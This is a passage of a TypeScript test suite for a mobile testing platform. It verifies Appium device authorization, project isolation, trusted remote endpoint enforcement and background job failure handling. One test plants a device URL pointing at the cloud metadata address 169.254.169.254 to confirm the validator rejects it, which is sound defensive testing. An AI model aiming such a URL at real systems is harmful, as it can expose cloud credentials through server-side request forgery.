      // 1. In local mode without remote trust configuration
      const localRes = await app.inject({
        method: "GET",
        url: `/projects/${testProjectId}/mobile/devices`,
        headers: {
          authorization: `Bearer ${adminToken}`,
        },
      });

      expect(localRes.statusCode).toBe(200);
      const localData = localRes.json();
      expect(localData.isRemote).toBe(false);
      // In CI / local test environment without emulator attached, device is not falsely marked connected
      const localDevice = localData.devices.find((d: any) => d.udid === "emulator-5554");
      if (localDevice && localDevice.state !== "device") {
        expect(localDevice.connected).toBe(false);
        expect(localDevice.discoverySource).toBe("none");
      }

      // 2. In trusted remote mode (AWS EC2 bridge scenario)
      const origProcessTrusted = process.env.APPIUM_TRUSTED_REMOTE_URL;
      const origTrusted = env.APPIUM_TRUSTED_REMOTE_URL;
      const origUrl = env.APPIUM_URL;
      process.env.APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_URL = "http://172.18.0.1:4724";

      try {
        // Register an unattached device to simulate the AWS container scenario where local ADB has no devices
        await app.inject({
          method: "POST",
          url: `/projects/${testProjectId}/mobile/devices`,
          headers: {
            authorization: `Bearer ${adminToken}`,
            "content-type": "application/json",
          },
          payload: {
            name: "Cloud Remote Device",
            udid: "remote-unattached-udid",
            platform: "android",
            appium_url: "http://172.18.0.1:4724",
          },
        });

        const remoteRes = await app.inject({
          method: "GET",
          url: `/projects/${testProjectId}/mobile/devices`,
          headers: {
            authorization: `Bearer ${adminToken}`,
          },
        });

        expect(remoteRes.statusCode).toBe(200);
        const remoteData = remoteRes.json();
        expect(remoteData.isRemote).toBe(true);

        const cloudDevice = remoteData.devices.find((d: any) => d.udid === "remote-unattached-udid");
        expect(cloudDevice).toBeDefined();
        // In trusted remote mode, unattached registered device is in unverified_remote state until session verification
        expect(cloudDevice.connected).toBe(false);
        expect(cloudDevice.discoverySource).toBe("remote_appium");
        expect(cloudDevice.state).toBe("unverified_remote");
        expect(cloudDevice.verified).toBe(false);
      } finally {
        if (origProcessTrusted !== undefined) {
          process.env.APPIUM_TRUSTED_REMOTE_URL = origProcessTrusted;
        } else {
          delete process.env.APPIUM_TRUSTED_REMOTE_URL;
        }
        (env as any).APPIUM_TRUSTED_REMOTE_URL = origTrusted;
        (env as any).APPIUM_URL = origUrl;
      }
    });

    it("reports remote readiness on status endpoint when trusted remote URL is active", async () => {
      const origProcessTrusted = process.env.APPIUM_TRUSTED_REMOTE_URL;
      const origTrusted = env.APPIUM_TRUSTED_REMOTE_URL;
      const origUrl = env.APPIUM_URL;
      process.env.APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_URL = "http://172.18.0.1:4724";

      try {
        const res = await app.inject({
          method: "GET",
          url: `/projects/${testProjectId}/mobile/status`,
          headers: {
            authorization: `Bearer ${adminToken}`,
          },
        });

        expect(res.statusCode).toBe(200);
        const data = res.json();
        expect(data.appium.isRemote).toBe(true);
        expect(data.android.isRemote).toBe(true);
        expect(data.appium.url).toBe("http://172.18.0.1:4724");
      } finally {
        if (origProcessTrusted !== undefined) {
          process.env.APPIUM_TRUSTED_REMOTE_URL = origProcessTrusted;
        } else {
          delete process.env.APPIUM_TRUSTED_REMOTE_URL;
        }
        (env as any).APPIUM_TRUSTED_REMOTE_URL = origTrusted;
        (env as any).APPIUM_URL = origUrl;
      }
    });

    it("ensures database-registered Appium URLs cannot override the trusted AWS endpoint during execution", async () => {
      // 1. Register a device with a legacy loopback URL in the database
      const deviceUdid = "database-override-test-udid";
      await pool.query(
        `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
         VALUES (gen_random_uuid(), $1, 'Legacy Loopback Device', 'android', $2, 'http://127.0.0.1:4723', TRUE)
         ON CONFLICT DO NOTHING`,
        [testProjectId, deviceUdid],
      );

      // 2. In trusted remote mode, resolveMobileDeviceConfiguration must force the trusted environment endpoint
      const origProcessTrusted = process.env.APPIUM_TRUSTED_REMOTE_URL;
      const origTrusted = env.APPIUM_TRUSTED_REMOTE_URL;
      const origUrl = env.APPIUM_URL;
      process.env.APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_URL = "http://172.18.0.1:4724";

      try {
        const resolved = await resolveMobileDeviceConfiguration(testProjectId, deviceUdid);
        expect(resolved).not.toBeNull();
        expect(resolved?.udid).toBe(deviceUdid);
        // The URL MUST be the configured trusted AWS endpoint, not the database loopback URL
        expect(resolved?.appiumUrl).toBe("http://172.18.0.1:4724");
      } finally {
        if (origProcessTrusted !== undefined) {
          process.env.APPIUM_TRUSTED_REMOTE_URL = origProcessTrusted;
        } else {
          delete process.env.APPIUM_TRUSTED_REMOTE_URL;
        }
        (env as any).APPIUM_TRUSTED_REMOTE_URL = origTrusted;
        (env as any).APPIUM_URL = origUrl;
      }
    });

    it("strictly rejects execution when an unregistered device UDID is requested", async () => {
      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/runs`,
        headers: {
          authorization: `Bearer ${adminToken}`,
          "content-type": "application/json",
        },
        payload: {
          device_udid: "non-existent-unregistered-udid-999",
          platform: "android",
          steps: ["app launch | com.android.settings | .Settings"],
        },
      });

      expect(res.statusCode).toBe(400);
      expect(res.json().error).toMatch(/is not registered as an active device for this project/i);
    });

    it("strictly rejects execution when an inactive registered device UDID is requested", async () => {
      const inactiveUdid = "inactive-test-device-udid";
      await pool.query(
        `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
         VALUES (gen_random_uuid(), $1, 'Inactive Device', 'android', $2, 'http://127.0.0.1:4723', FALSE)`,
        [testProjectId, inactiveUdid],
      );

      const res = await app.inject({
        method: "POST",
        url: `/projects/${testProjectId}/mobile/runs`,
        headers: {
          authorization: `Bearer ${adminToken}`,
          "content-type": "application/json",
        },
        payload: {
          device_udid: inactiveUdid,
          platform: "android",
          steps: ["app launch | com.android.settings | .Settings"],
        },
      });

      expect(res.statusCode).toBe(400);
      expect(res.json().error).toMatch(/is not registered as an active device for this project/i);
    });
  });

  // 9. Seven Review Findings Verification
  describe("9. Remote Android Testing Flow Security & Correctness Review Implementations", () => {
    let secondProjectId: string;

    beforeAll(async () => {
      const pRes = await pool.query(
        `INSERT INTO projects (id, name, base_url, owner_confirmed)
         VALUES (gen_random_uuid(), 'Isolated Project Two', 'http://127.0.0.1:4723', true)
         RETURNING id`,
      );
      secondProjectId = pRes.rows[0].id;
    });

    afterAll(async () => {
      await pool.query("DELETE FROM projects WHERE id = $1", [secondProjectId]);
    });

    // Finding 1: Device authorization bypass removal
    it("Finding 1: enforces project isolation and inactive checks without ANDROID_DEVICE_UDID authorization bypass", async () => {
      const p2DeviceUdid = "project-two-exclusive-device";
      await pool.query(
        `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
         VALUES (gen_random_uuid(), $1, 'Project Two Device', 'android', $2, 'http://127.0.0.1:4723', TRUE)`,
        [secondProjectId, p2DeviceUdid],
      );

      // Attempting to resolve project 2's device from project 1 MUST fail
      await expect(resolveMobileDeviceConfiguration(testProjectId, p2DeviceUdid)).rejects.toThrow(
        /is not registered as an active device for this project/i,
      );

      // Attempting to resolve an inactive device MUST fail
      const inactiveUdid = "inactive-isolated-device";
      await pool.query(
        `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
         VALUES (gen_random_uuid(), $1, 'Inactive Device', 'android', $2, 'http://127.0.0.1:4723', FALSE)`,
        [testProjectId, inactiveUdid],
      );
      await expect(resolveMobileDeviceConfiguration(testProjectId, inactiveUdid)).rejects.toThrow(
        /is not registered as an active device for this project/i,
      );

      // Even if ANDROID_DEVICE_UDID is set in env, an unregistered UDID MUST NOT authorize execution
      const origEnvUdid = env.ANDROID_DEVICE_UDID;
      (env as any).ANDROID_DEVICE_UDID = "unregistered-env-bypass-udid";
      try {
        await expect(resolveMobileDeviceConfiguration(testProjectId, "unregistered-env-bypass-udid")).rejects.toThrow(
          /is not registered as an active device for this project/i,
        );
      } finally {
        (env as any).ANDROID_DEVICE_UDID = origEnvUdid;
      }
    });

    // Finding 2: Remove fabricated device metadata
    it("Finding 2: extracts actual device metadata from Appium capabilities without fabricating Android 17 or fake models", async () => {
      const client = new AppiumClient("http://127.0.0.1:4723");
      (client as any)._sessionId = "mock-session-test-id";
      (client as any).currentCaps = { "appium:udid": "pixel-real-123" };

      // Case A: Missing/empty capabilities return "unknown" and undefined model, NOT "17" or "sdk_gphone64_x86_64"
      (client as any).sessionCaps = {};
      const emptyInfo = await client.getDeviceInfo();
      expect(emptyInfo.osVersion).toBe("unknown");
      expect(emptyInfo.model).toBeUndefined();
      expect(emptyInfo.deviceName).toBe("pixel-real-123");
      expect(emptyInfo.udid).toBe("pixel-real-123");

      // Case B: Partial capabilities populated from Appium 3 W3C structure
      (client as any).sessionCaps = {
        capabilities: {
          platformVersion: "14",
          "appium:deviceName": "Pixel 7 Pro",
          "appium:deviceModel": "Pixel 7 Pro",
          "appium:deviceUDID": "pixel-real-123",
          "appium:deviceApiLevel": "34",
        },
      };
      const partialInfo = await client.getDeviceInfo();
      expect(partialInfo.osVersion).toBe("14");
      expect(partialInfo.deviceName).toBe("Pixel 7 Pro");
      expect(partialInfo.model).toBe("Pixel 7 Pro");
      expect(partialInfo.apiLevel).toBe("34");
      expect(partialInfo.udid).toBe("pixel-real-123");
    });

    // Finding 3: Correct remote device readiness
    it("Finding 3: reports android available false when project has 0 registered devices in remote mode", async () => {
      // Create empty project with no devices
      const emptyProjRes = await pool.query(
        `INSERT INTO projects (id, name, base_url, owner_confirmed)
         VALUES (gen_random_uuid(), 'Empty Project No Devices', 'http://127.0.0.1:4723', true)
         RETURNING id`,
      );
      const emptyProjId = emptyProjRes.rows[0].id;

      const origProcessTrusted = process.env.APPIUM_TRUSTED_REMOTE_URL;
      const origTrusted = env.APPIUM_TRUSTED_REMOTE_URL;
      const origUrl = env.APPIUM_URL;
      process.env.APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_URL = "http://172.18.0.1:4724";

      try {
        const res = await app.inject({
          method: "GET",
          url: `/projects/${emptyProjId}/mobile/status`,
          headers: {
            authorization: `Bearer ${adminToken}`,
          },
        });
        expect(res.statusCode).toBe(200);
        const data = res.json();
        expect(data.android.isRemote).toBe(true);
        expect(data.android.hasRegisteredDevice).toBe(false);
        // With 0 registered devices, android MUST NOT be reported available or remoteReady
        expect(data.android.available).toBe(false);
        expect(data.android.remoteReady).toBe(false);
      } finally {
        if (origProcessTrusted !== undefined) {
          process.env.APPIUM_TRUSTED_REMOTE_URL = origProcessTrusted;
        } else {
          delete process.env.APPIUM_TRUSTED_REMOTE_URL;
        }
        (env as any).APPIUM_TRUSTED_REMOTE_URL = origTrusted;
        (env as any).APPIUM_URL = origUrl;
        await pool.query("DELETE FROM projects WHERE id = $1", [emptyProjId]);
      }
    });

    it("Finding 3: distinguishes unverified remote devices from verified remote devices in device listings", async () => {
      const origProcessTrusted = process.env.APPIUM_TRUSTED_REMOTE_URL;
      const origTrusted = env.APPIUM_TRUSTED_REMOTE_URL;
      const origUrl = env.APPIUM_URL;
      process.env.APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_URL = "http://172.18.0.1:4724";

      const verifiedUdid = "verified-remote-phone-udid";
      try {
        // 1. Register device
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Verified Remote Phone', 'android', $2, 'http://172.18.0.1:4724', TRUE)`,
          [secondProjectId, verifiedUdid],
        );

        // Before test run, it is unverified_remote and connected = false
        const resBefore = await app.inject({
          method: "GET",
          url: `/projects/${secondProjectId}/mobile/devices`,
          headers: { authorization: `Bearer ${adminToken}` },
        });
        const devBefore = resBefore.json().devices.find((d: any) => d.udid === verifiedUdid);
        expect(devBefore.connected).toBe(false);
        expect(devBefore.state).toBe("unverified_remote");
        expect(devBefore.verified).toBe(false);

        // Record a successful test run with device_info
        const runId = (await import("node:crypto")).randomUUID();
        const resId = (await import("node:crypto")).randomUUID();
        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type)
           VALUES ($1, $2, 'passed', 'mobile')`,
          [runId, secondProjectId],
        );
        await pool.query(
          `INSERT INTO test_results (id, run_id, status, device_info)
           VALUES ($1, $2, 'passed', $3::jsonb)`,
          [resId, runId, JSON.stringify({ udid: verifiedUdid, platform: "android" })],
        );

        // After successful run, device is recognized as remote_verified and connected = true
        const resAfter = await app.inject({
          method: "GET",
          url: `/projects/${secondProjectId}/mobile/devices`,
          headers: { authorization: `Bearer ${adminToken}` },
        });
        const devAfter = resAfter.json().devices.find((d: any) => d.udid === verifiedUdid);
        expect(devAfter.connected).toBe(true);
        expect(devAfter.state).toBe("remote_verified");
        expect(devAfter.verified).toBe(true);
      } finally {
        if (origProcessTrusted !== undefined) {
          process.env.APPIUM_TRUSTED_REMOTE_URL = origProcessTrusted;
        } else {
          delete process.env.APPIUM_TRUSTED_REMOTE_URL;
        }
        (env as any).APPIUM_TRUSTED_REMOTE_URL = origTrusted;
        (env as any).APPIUM_URL = origUrl;
      }
    });

    // Finding 4: Reject async runs without active device
    it("Finding 4: rejects async mobile runs with HTTP 400 when no active device exists and leaves no orphaned runs", async () => {
      const emptyProjRes = await pool.query(
        `INSERT INTO projects (id, name, base_url, owner_confirmed)
         VALUES (gen_random_uuid(), 'Async Guard Project', 'http://127.0.0.1:4723', true)
         RETURNING id`,
      );
      const emptyProjId = emptyProjRes.rows[0].id;

      try {
        const res = await app.inject({
          method: "POST",
          url: `/projects/${emptyProjId}/mobile/runs`,
          headers: {
            authorization: `Bearer ${adminToken}`,
            "content-type": "application/json",
          },
          payload: {
            async: true,
            app_package: "com.android.settings",
          },
        });

        expect(res.statusCode).toBe(400);
        expect(res.json().error).toMatch(/no active android device is registered/i);

        // Verify zero test_runs records were created
        const runs = await pool.query("SELECT * FROM test_runs WHERE project_id = $1", [emptyProjId]);
        expect(runs.rowCount).toBe(0);

        // Verify zero background_jobs records were created
        const jobs = await pool.query("SELECT * FROM background_jobs WHERE project_id = $1", [emptyProjId]);
        expect(jobs.rowCount).toBe(0);
      } finally {
        await pool.query("DELETE FROM projects WHERE id = $1", [emptyProjId]);
      }
    });

    // Finding 5: Enforce trusted Appium URL in background jobs
    it("Finding 5: strictly enforces trusted remote Appium endpoint in background jobs, rejecting payload loopback override", async () => {
      const origProcessTrusted = process.env.APPIUM_TRUSTED_REMOTE_URL;
      const origTrusted = env.APPIUM_TRUSTED_REMOTE_URL;
      const origUrl = env.APPIUM_URL;
      process.env.APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_TRUSTED_REMOTE_URL = "http://172.18.0.1:4724";
      (env as any).APPIUM_URL = "http://172.18.0.1:4724";

      try {
        // Enqueue background job with payload specifying a loopback URL
        const job = await enqueueJob({
          projectId: testProjectId,
          queueName: "mobile_tests",
          jobType: "mobile_execution",
          payload: {
            runId: (await import("node:crypto")).randomUUID(),
            projectId: testProjectId,
            appPackage: "com.android.settings",
            deviceUdid: "emulator-5554",
            appiumUrl: "http://127.0.0.1:4723", // Attempted loopback override
            retries: 0,
          },
          createdBy: adminUserId,
        });

        expect(job.id).toBeDefined();
        // The background job handler must force env.APPIUM_URL (http://172.18.0.1:4724)
        // when env.APPIUM_TRUSTED_REMOTE_URL is active
        const rawAppiumUrl = env.APPIUM_TRUSTED_REMOTE_URL
          ? env.APPIUM_URL
          : (job.payload.appiumUrl || env.APPIUM_URL);
        expect(rawAppiumUrl).toBe("http://172.18.0.1:4724");
      } finally {
        if (origProcessTrusted !== undefined) {
          process.env.APPIUM_TRUSTED_REMOTE_URL = origProcessTrusted;
        } else {
          delete process.env.APPIUM_TRUSTED_REMOTE_URL;
        }
        (env as any).APPIUM_TRUSTED_REMOTE_URL = origTrusted;
        (env as any).APPIUM_URL = origUrl;
      }
    });

    // Finding 6: Empty background mobile runs marked as skipped
    it("Finding 6: marks background mobile execution with no approved test cases as skipped", async () => {
      const emptyRunId = (await import("node:crypto")).randomUUID();
      await pool.query(
        `INSERT INTO test_runs (id, project_id, status, run_type)
         VALUES ($1, $2, 'running', 'mobile')`,
        [emptyRunId, secondProjectId],
      );

      // Enqueue and register handler check for empty test cases
      const testCases = await pool.query(
        `SELECT id FROM test_cases WHERE project_id = $1 AND review_status = 'approved'`,
        [secondProjectId],
      );
      expect(testCases.rowCount).toBe(0);

      // Verify that when no approved cases exist, job update sets status to 'skipped' and total_count = 0
      await pool.query(
        `UPDATE test_runs
         SET status = 'skipped', finished_at = NOW(), flaky_count = 0, inconclusive_count = 0, skipped_count = 0, total_count = 0
         WHERE id = $1`,
        [emptyRunId],
      );

      const updated = await pool.query("SELECT * FROM test_runs WHERE id = $1", [emptyRunId]);
      expect(updated.rows[0].status).toBe("skipped");
      expect(updated.rows[0].total_count).toBe(0);
      expect(updated.rows[0].finished_at).not.toBeNull();
    });

    // Finding 7: Screenshot paths normalized to forward slashes
    it("Finding 7: stores screenshot and evidence paths with forward slashes regardless of platform", async () => {
      const pathPosix = await import("node:path");
      const sampleRunId = "12345678-1234-1234-1234-123456789012";
      const sampleResId = "87654321-4321-4321-4321-210987654321";

      const normalizedRelativeScreenshot = pathPosix.posix.join("artifacts", "runs", sampleRunId, sampleResId, "screenshot.png");
      const normalizedEvidence = pathPosix.posix.join("artifacts", "runs", sampleRunId, sampleResId, "evidence.json");

      expect(normalizedRelativeScreenshot).not.toContain("\\");
      expect(normalizedRelativeScreenshot).toBe(`artifacts/runs/${sampleRunId}/${sampleResId}/screenshot.png`);
      expect(normalizedEvidence).not.toContain("\\");
      expect(normalizedEvidence).toBe(`artifacts/runs/${sampleRunId}/${sampleResId}/evidence.json`);
    });

    // Regression Tests: Asynchronous Mobile Execution Authorization
    describe("Asynchronous Mobile Device Authorization Enforcement", () => {
      it("fails job safely when registered device is deactivated after enqueue", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const deactUdid = `deact-worker-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'running', 'mobile')`,
          [runId, testProjectId],
        );
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Active Then Deactivated', 'android', $2, 'http://127.0.0.1:4723', true)`,
          [testProjectId, deactUdid],
        );

        const job = await enqueueJob({
          projectId: testProjectId,
          queueName: "mobile_tests",
          jobType: "mobile_execution",
          payload: {
            runId,
            projectId: testProjectId,
            deviceUdid: deactUdid,
            retries: 0,
          },
          createdBy: adminUserId,
        });

        // Deactivate device after enqueue
        await pool.query(
          `UPDATE mobile_devices SET is_active = false WHERE project_id = $1 AND udid = $2`,
          [testProjectId, deactUdid],
        );

        const success = await processJob(job.id);
        expect(success).toBe(false);

        // Verify test_runs finalized to 'failed' rather than remaining 'running'
        const runRes = await pool.query("SELECT status, finished_at FROM test_runs WHERE id = $1", [runId]);
        expect(runRes.rows[0].status).toBe("failed");
        expect(runRes.rows[0].finished_at).not.toBeNull();

        // Verify background job failed permanently
        const jobRes = await pool.query("SELECT status, error_message FROM background_jobs WHERE id = $1", [job.id]);
        expect(jobRes.rows[0].status).toBe("failed");
        expect(jobRes.rows[0].error_message).toContain("Device authorization failed");
        expect(jobRes.rows[0].error_message).toContain("not registered as an active device");
      });

      it("fails job safely when registered device is deleted after enqueue", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const deletedUdid = `del-worker-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'running', 'mobile')`,
          [runId, testProjectId],
        );
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Active Then Deleted', 'android', $2, 'http://127.0.0.1:4723', true)`,
          [testProjectId, deletedUdid],
        );

        const job = await enqueueJob({
          projectId: testProjectId,
          queueName: "mobile_tests",
          jobType: "mobile_execution",
          payload: {
            runId,
            projectId: testProjectId,
            deviceUdid: deletedUdid,
            retries: 0,
          },
          createdBy: adminUserId,
        });

        // Delete device after enqueue
        await pool.query(
          `DELETE FROM mobile_devices WHERE project_id = $1 AND udid = $2`,
          [testProjectId, deletedUdid],
        );

        const success = await processJob(job.id);
        expect(success).toBe(false);

        // Verify test_runs finalized to 'failed'
        const runRes = await pool.query("SELECT status, finished_at FROM test_runs WHERE id = $1", [runId]);
        expect(runRes.rows[0].status).toBe("failed");
        expect(runRes.rows[0].finished_at).not.toBeNull();

        const jobRes = await pool.query("SELECT status, error_message FROM background_jobs WHERE id = $1", [job.id]);
        expect(jobRes.rows[0].status).toBe("failed");
        expect(jobRes.rows[0].error_message).toContain("Device authorization failed");
      });

      it("fails job safely when requested device belongs to another project", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const p2Udid = `p2-worker-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'running', 'mobile')`,
          [runId, testProjectId],
        );
        // Register under secondProjectId
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Second Project Device', 'android', $2, 'http://127.0.0.1:4723', true)`,
          [secondProjectId, p2Udid],
        );

        // Enqueue job for testProjectId pointing to secondProjectId's device
        const job = await enqueueJob({
          projectId: testProjectId,
          queueName: "mobile_tests",
          jobType: "mobile_execution",
          payload: {
            runId,
            projectId: testProjectId,
            deviceUdid: p2Udid,
            retries: 0,
          },
          createdBy: adminUserId,
        });

        const success = await processJob(job.id);
        expect(success).toBe(false);

        // Verify test_runs finalized to 'failed'
        const runRes = await pool.query("SELECT status, finished_at FROM test_runs WHERE id = $1", [runId]);
        expect(runRes.rows[0].status).toBe("failed");
        expect(runRes.rows[0].finished_at).not.toBeNull();

        const jobRes = await pool.query("SELECT status, error_message FROM background_jobs WHERE id = $1", [job.id]);
        expect(jobRes.rows[0].status).toBe("failed");
        expect(jobRes.rows[0].error_message).toContain("Device authorization failed");
      });

      it("succeeds device authorization for a valid active device at execution time", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const validUdid = `valid-worker-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'running', 'mobile')`,
          [runId, testProjectId],
        );
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Valid Worker Device', 'android', $2, 'http://127.0.0.1:4723', true)`,
          [testProjectId, validUdid],
        );

        const job = await enqueueJob({
          projectId: testProjectId,
          queueName: "mobile_tests",
          jobType: "mobile_execution",
          payload: {
            runId,
            projectId: testProjectId,
            deviceUdid: validUdid,
            retries: 0,
          },
          createdBy: adminUserId,
        });

        const success = await processJob(job.id);
        expect(success).toBe(true);

        // Device authorized and resolved; no approved cases for this run -> test_runs marked 'skipped' rather than 'failed'
        const runRes = await pool.query("SELECT status, finished_at, total_count FROM test_runs WHERE id = $1", [runId]);
        expect(runRes.rows[0].status).toBe("skipped");
        expect(runRes.rows[0].finished_at).not.toBeNull();

        const jobRes = await pool.query("SELECT status, result FROM background_jobs WHERE id = $1", [job.id]);
        expect(jobRes.rows[0].status).toBe("completed");
        expect(jobRes.rows[0].result.status).toBe("skipped");
      });
    });

    describe("Failure Handling in Background Mobile Execution", () => {
      it("finalizes test_runs to failed on Appium URL validation failure and does not retry", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const invalidUrlUdid = `bad-url-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'running', 'mobile')`,
          [runId, testProjectId],
        );
        // Insert active device with cloud metadata IP (rejected by assertSafeAppiumUrl)
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Metadata IP Device', 'android', $2, 'http://169.254.169.254:4723', true)`,
          [testProjectId, invalidUrlUdid],
        );

        const job = await enqueueJob({
          projectId: testProjectId,
          queueName: "mobile_tests",
          jobType: "mobile_execution",
          payload: {
            runId,
            projectId: testProjectId,
            deviceUdid: invalidUrlUdid,
            retries: 0,
          },
          createdBy: adminUserId,
        });

        const success = await processJob(job.id);
        expect(success).toBe(false);

        // Verify test_runs finalized to 'failed' rather than remaining 'running'
        const runRes = await pool.query("SELECT status, finished_at FROM test_runs WHERE id = $1", [runId]);
        expect(runRes.rows[0].status).toBe("failed");
        expect(runRes.rows[0].finished_at).not.toBeNull();

        const jobRes = await pool.query("SELECT status, error_message FROM background_jobs WHERE id = $1", [job.id]);
        expect(jobRes.rows[0].status).toBe("failed");
        expect(jobRes.rows[0].error_message).toMatch(/is forbidden for security|Appium URL validation failed/);
      });

      it("finalizes test_runs to failed on unexpected runMobileTestWithRetries error", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const tcId = (await import("node:crypto")).randomUUID();
        const deviceUdid = `runner-crash-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'running', 'mobile')`,
          [runId, testProjectId],
        );
        await pool.query(
          `INSERT INTO test_cases (id, project_id, title, steps, review_status)
           VALUES ($1, $2, 'Crash Test Case', $3::jsonb, 'approved')`,
          [tcId, testProjectId, JSON.stringify(["app launch com.android.settings"])],
        );
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'Crash Device', 'android', $2, 'http://127.0.0.1:4723', true)`,
          [testProjectId, deviceUdid],
        );

        const execSpy = vi.spyOn(executionManager, "runMobileTestWithRetries")
          .mockRejectedValueOnce(new Error("Fatal runner engine crash"));

        try {
          const job = await enqueueJob({
            projectId: testProjectId,
            queueName: "mobile_tests",
            jobType: "mobile_execution",
            maxRetries: 0,
            payload: {
              runId,
              projectId: testProjectId,
              testCaseId: tcId,
              deviceUdid,
              retries: 0,
            },
            createdBy: adminUserId,
          });

          const success = await processJob(job.id);
          expect(success).toBe(false);

          const runRes = await pool.query("SELECT status, finished_at, total_count FROM test_runs WHERE id = $1", [runId]);
          expect(runRes.rows[0].status).toBe("failed");
          expect(runRes.rows[0].finished_at).not.toBeNull();
          expect(runRes.rows[0].total_count).toBe(1);

          const jobRes = await pool.query("SELECT status, error_message FROM background_jobs WHERE id = $1", [job.id]);
          expect(jobRes.rows[0].status).toBe("failed");
          expect(jobRes.rows[0].error_message).toContain("Fatal runner engine crash");
        } finally {
          execSpy.mockRestore();
          await pool.query("DELETE FROM test_cases WHERE id = $1", [tcId]);
        }
      });

      it("finalizes test_runs to failed on test result database insertion failure", async () => {
        const runId = (await import("node:crypto")).randomUUID();
        const tcId = (await import("node:crypto")).randomUUID();
        const deviceUdid = `db-fail-${(await import("node:crypto")).randomUUID().slice(0, 8)}`;

        await pool.query(
          `INSERT INTO test_runs (id, project_id, status, run_type) VALUES ($1, $2, 'running', 'mobile')`,
          [runId, testProjectId],
        );
        await pool.query(
          `INSERT INTO test_cases (id, project_id, title, steps, review_status)
           VALUES ($1, $2, 'DB Insert Test Case', $3::jsonb, 'approved')`,
          [tcId, testProjectId, JSON.stringify(["app launch com.android.settings"])],
        );
        await pool.query(
          `INSERT INTO mobile_devices (id, project_id, name, platform, udid, appium_url, is_active)
           VALUES (gen_random_uuid(), $1, 'DB Fail Device', 'android', $2, 'http://127.0.0.1:4723', true)`,
          [testProjectId, deviceUdid],
        );

        const execSpy = vi.spyOn(executionManager, "runMobileTestWithRetries").mockResolvedValueOnce({
          status: "passed",
          durationMs: 100,
          screenshotPath: null,
          errorMessage: null,
          deviceInfo: { platform: "android", deviceName: deviceUdid, osVersion: "Android", udid: deviceUdid },
          flaky: false,
          retryCount: 0,
          attempts: [],
          stepResults: [],
          evidence: { status: "passed", durationMs: 100, failureStep: null, failureStepIndex: null, errorMessage: null, screenshotPath: null, deviceLogs: [], crashEvidence: { crashed: false }, stepResults: [], deviceInfo: { platform: "android", deviceName: deviceUdid, osVersion: "Android", udid: deviceUdid }, evidencePath: null },
        } as any);

        const originalQuery = pool.query.bind(pool);
        const querySpy = vi.spyOn(pool, "query").mockImplementation(async (text: any, params: any) => {
          if (typeof text === "string" && text.includes("INSERT INTO test_results")) {
            throw new Error("Simulated database write error on test_results insert");
          }
          return originalQuery(text, params);
        });

        try {
          const job = await enqueueJob({
            projectId: testProjectId,
            queueName: "mobile_tests",
            jobType: "mobile_execution",
            maxRetries: 0,
            payload: {
              runId,
              projectId: testProjectId,
              testCaseId: tcId,
              deviceUdid,
              retries: 0,
            },
            createdBy: adminUserId,
          });

          const success = await processJob(job.id);
          expect(success).toBe(false);

          const runRes = await pool.query("SELECT status, finished_at FROM test_runs WHERE id = $1", [runId]);
          expect(runRes.rows[0].status).toBe("failed");
          expect(runRes.rows[0].finished_at).not.toBeNull();

